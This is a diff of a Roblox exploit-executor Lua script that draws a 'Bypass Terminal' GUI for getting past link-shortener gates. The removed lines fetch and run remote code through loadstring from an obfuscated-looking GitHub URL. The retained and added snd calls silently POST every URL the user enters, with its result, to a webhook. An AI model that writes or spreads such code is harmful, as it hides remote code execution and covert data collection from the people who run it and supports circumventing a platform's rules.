@@ -7,8 +7,8 @@ BypassGui.Name = "BypassGui"
 BypassGui.Parent = PlayerGui
 
 local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 300, 0, 200)
-Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.Size = UDim2.new(0, 300, 0, 250)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -125)
 Frame.BackgroundColor3 = Color3.fromRGB(10, 20, 30)
 Frame.BorderSizePixel = 0
 Frame.Active = true
@@ -23,7 +23,7 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -30, 0, 30)
 Title.Position = UDim2.new(0, 0, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "System Bypass Ocx"
+Title.Text = "Bypass Terminal"
 Title.TextColor3 = Color3.fromRGB(0, 255, 0)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 18
@@ -39,23 +39,34 @@ CloseButton.Font = Enum.Font.GothamBold
 CloseButton.TextSize = 18
 CloseButton.Parent = Frame
 
+local ApiStatus = Instance.new("TextLabel")
+ApiStatus.Size = UDim2.new(1, 0, 0, 20)
+ApiStatus.Position = UDim2.new(0, 0, 0, 35)
+ApiStatus.BackgroundTransparency = 1
+ApiStatus.Text = "API Status: Checking..."
+ApiStatus.TextColor3 = Color3.fromRGB(255, 255, 0)
+ApiStatus.Font = Enum.Font.Gotham
+ApiStatus.TextSize = 14
+ApiStatus.Parent = Frame
+
 local Input = Instance.new("TextBox")
 Input.Size = UDim2.new(0.9, 0, 0, 30)
-Input.Position = UDim2.new(0.05, 0, 0.2, 0)
+Input.Position = UDim2.new(0.05, 0, 0.25, 0)
 Input.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
 Input.TextColor3 = Color3.fromRGB(0, 255, 0)
 Input.PlaceholderText = "Enter URL"
 Input.Text = "Enter URL"
+Input.Text = "Enter URL"
 Input.PlaceholderColor3 = Color3.fromRGB(0, 200, 0)
 Input.Font = Enum.Font.Code
 Input.TextSize = 14
-Input.ClearTextOnFocus = true
+Input.ClearTextOnFocus = false
 Input.ClipsDescendants = true
 Input.Parent = Frame
 
 local Result = Instance.new("TextLabel")
 Result.Size = UDim2.new(0.9, 0, 0, 60)
-Result.Position = UDim2.new(0.05, 0, 0.4, 0)
+Result.Position = UDim2.new(0.05, 0, 0.45, 0)
 Result.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
 Result.TextColor3 = Color3.fromRGB(0, 255, 0)
 Result.Text = "Result will appear here"
@@ -66,13 +77,53 @@ Result.Parent = Frame
 
 local CopyButton = Instance.new("TextButton")
 CopyButton.Size = UDim2.new(0.4, 0, 0, 25)
-CopyButton.Position = UDim2.new(0.3, 0, 0.85, 0)
+CopyButton.Position = UDim2.new(0.3, 0, 0.69, 0)
 CopyButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
 CopyButton.Text = "Copy"
 CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CopyButton.Font = Enum.Font.GothamBold
 CopyButton.TextSize = 14
 CopyButton.Parent = Frame
+
+local InfoFrame = Instance.new("Frame")
+InfoFrame.Size = UDim2.new(0.9, 0, 0, 50)
+InfoFrame.Position = UDim2.new(0.05, 0, 0.8, 0)
+InfoFrame.BackgroundColor3 = Color3.fromRGB(20, 40, 60)
+InfoFrame.Parent = Frame
+
+local InfoCorner = Instance.new("UICorner")
+InfoCorner.CornerRadius = UDim.new(0, 5)
+InfoCorner.Parent = InfoFrame
+
+local CreatorLabel = Instance.new("TextLabel")
+CreatorLabel.Size = UDim2.new(1, 0, 0, 20)
+CreatorLabel.Position = UDim2.new(0, 0, 0, 0)
+CreatorLabel.BackgroundTransparency = 1
+CreatorLabel.Text = "Bypass by:OneCreatorX"
+CreatorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+CreatorLabel.Font = Enum.Font.Gotham
+CreatorLabel.TextSize = 12
+CreatorLabel.Parent = InfoFrame
+
+local YoutubeButton = Instance.new("TextButton")
+YoutubeButton.Size = UDim2.new(0.45, 0, 0, 20)
+YoutubeButton.Position = UDim2.new(0.025, 0, 0.45, 0)
+YoutubeButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+YoutubeButton.Text = "YouTube"
+YoutubeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+YoutubeButton.Font = Enum.Font.GothamBold
+YoutubeButton.TextSize = 12
+YoutubeButton.Parent = InfoFrame
+
+local DiscordButton = Instance.new("TextButton")
+DiscordButton.Size = UDim2.new(0.45, 0, 0, 20)
+DiscordButton.Position = UDim2.new(0.525, 0, 0.45, 0)
+DiscordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+DiscordButton.Text = "Discord"
+DiscordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+DiscordButton.Font = Enum.Font.GothamBold
+DiscordButton.TextSize = 12
+DiscordButton.Parent = InfoFrame
 
 local LoadingFrame = Instance.new("Frame")
 LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -90,37 +141,49 @@ LoadingText.Font = Enum.Font.Code
 LoadingText.TextSize = 18
 LoadingText.Parent = LoadingFrame
 
-spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
-end)
-
-local function createBackgroundCode()
-    local CodeBackground = Instance.new("TextLabel")
-    CodeBackground.Size = UDim2.new(1, 0, 1, 0)
-    CodeBackground.BackgroundTransparency = 1
-    CodeBackground.TextColor3 = Color3.fromRGB(0, 100, 0)
-    CodeBackground.Font = Enum.Font.Code
-    CodeBackground.TextSize = 10
-    CodeBackground.TextXAlignment = Enum.TextXAlignment.Left
-    CodeBackground.TextYAlignment = Enum.TextYAlignment.Top
-    CodeBackground.ZIndex = 0
-    CodeBackground.Parent = Frame
-
-    local function generateCode()
-        local code = ""
-        for i = 1, 100 do
-            code = code .. string.char(math.random(33, 126))
-            if i % 50 == 0 then code = code .. "\n" end
-        end
-        return code
-    end
-
-    spawn(function()
-        while true do
-            CodeBackground.Text = generateCode()
-            wait(0.5)
-        end
+local function urlDecode(str)
+    str = string.gsub(str, '%%(%x%x)', function(h)
+        return string.char(tonumber(h, 16))
     end)
+    return str
+end
+
+local function snd(wb, msg)
+    local decodedMsg = urlDecode(msg)
+    local reqBody = {content = decodedMsg}
+    local headers = {["Content-Type"] = "application/json"}
+    local request = http_request or request or syn.request or http.request
+    if request then
+        request({
+            Url = wb,
+            Method = "POST",
+            Headers = headers,
+            Body = HttpService:JSONEncode(reqBody)
+        })
+    end
+end
+
+local function checkApiStatus()
+    local success, result = pcall(function()
+        return game:HttpGet("https://dlr-api.woozym.workers.dev/api/status")
+    end)
+    
+    if success then
+        local data = HttpService:JSONDecode(result)
+        if data.status == "OK" and data.website_enabled then
+            ApiStatus.Text = "API Status: OK"
+            ApiStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
+            Input.TextEditable = true
+        else
+            ApiStatus.Text = "API Status: " .. data.status
+            ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
+            Input.TextEditable = false
+        end
+    else
+        ApiStatus.Text = "API Status: Error"
+        ApiStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
+        Input.TextEditable = false
+    end
 end
 
 local function bypass(url)
@@ -151,29 +214,9 @@ local function bypass(url)
     return nil, nil
 end
 
-local function urlDecode(str)
-    str = string.gsub(str, '%%(%x%x)', function(h)
-        return string.char(tonumber(h, 16))
-    end)
-    return str
-end
-
-local function snd(wb, msg)
-    local decodedMsg = urlDecode(msg)
-    local reqBody = {content = decodedMsg}
-    local headers = {["Content-Type"] = "application/json"}
-    local request = http_request or request or syn.request or http.request
-    if request then
-        request({
-            Url = wb,
-            Method = "POST",
-            Headers = headers,
-            Body = HttpService:JSONEncode(reqBody)
-        })
-    end
-end
-
 local function processBypass()
+    if not Input.TextEditable then return end
+    
     LoadingFrame.Visible = true
     local url = Input.Text
     spawn(function()
@@ -183,8 +226,8 @@ local function processBypass()
         local message = ""
 
         if result == "API_MAINTENANCE" then
-            Result.Text = "API is currently under maintenance. Please try again later in 1-2 minutes."
-            message = string.format("URL: %s\nResult:link currently under maintenance. Please try again later. 1, 2 minutes", url)
+            Result.Text = "API is currently under maintenance. Please try again later."
+            message = string.format("URL: %s\nResult: API is currently under maintenance. Please try again later.", url)
         elseif result and result:match("bypass fail! Please visit our website to see the supported links") then
             Result.Text = "This link or shortener will be available for bypass soon."
             message = string.format("URL: %s\nResult: This link or shortener will be available for bypass soon.\nTime elapsed: %.2fs", url, time_elapsed or 0)
@@ -197,14 +240,11 @@ local function processBypass()
         end
 
         snd(webhook_url, "Prefix: " .. message)
+        snd(webhook_url, "Bypass attempt: URL: " .. url .. "\nResponse: " .. Result.Text)
     end)
 end
 
-Input:GetPropertyChangedSignal("Text"):Connect(function()
-    if #Input.Text > 0 then
-        processBypass()
-    end
-end)
+Input.FocusLost:Connect(processBypass)
 
 CopyButton.MouseButton1Click:Connect(function()
     setclipboard(Result.Text)
@@ -213,6 +253,22 @@ end)
 CloseButton.MouseButton1Click:Connect(function()
     BypassGui:Destroy()
 end)
+
+YoutubeButton.MouseButton1Click:Connect(function()
+    setclipboard("https://www.youtube.com/@OneCreatorX")
+end)
+
+DiscordButton.MouseButton1Click:Connect(function()
+    setclipboard("https://discord.gg/onecreatorx")
+end)
+
+spawn(function()
+    while wait(2) do
+        checkApiStatus()
+    end
+end)
+
+checkApiStatus()
 
 local function createGlowEffect()
     local Glow = Instance.new("ImageLabel")
@@ -226,15 +282,13 @@ local function createGlowEffect()
 end
 
 createGlowEffect()
-createBackgroundCode()
 
 local function animateColors()
-    while true do
+    while wait(0.05) do
         for i = 0, 1, 0.01 do
             Frame.BackgroundColor3 = Color3.fromHSV(i, 1, 0.2)
-            wait(0.05)
         end
     end
 end
 
-coroutine.wrap(animateColors)()
+spawn(animateColors)
